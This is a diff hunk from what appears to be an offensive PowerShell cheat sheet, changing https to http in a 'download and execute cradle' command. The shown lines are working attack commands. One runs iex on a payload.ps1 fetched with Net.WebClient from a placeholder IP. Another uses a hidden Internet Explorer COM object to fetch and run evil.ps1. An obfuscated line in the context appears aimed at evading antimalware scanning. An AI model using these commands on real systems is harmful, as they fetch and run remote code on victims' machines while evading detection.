@@ -128,7 +128,7 @@ Invoke-Command -Scriptblock {S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + (
 #### Download and execute cradle
 - Usefull tool: https://github.com/danielbohannon/Invoke-CradleCrafter
 ```
-iex (New-Object Net.WebClient).DownloadString('https://xx.xx.xx.xx/payload.ps1')
+iex (New-Object Net.WebClient).DownloadString('http://xx.xx.xx.xx/payload.ps1')
 
 $ie=New-Object -ComObjectInternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://xx.xx.xx.xx/evil.ps1');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response
 
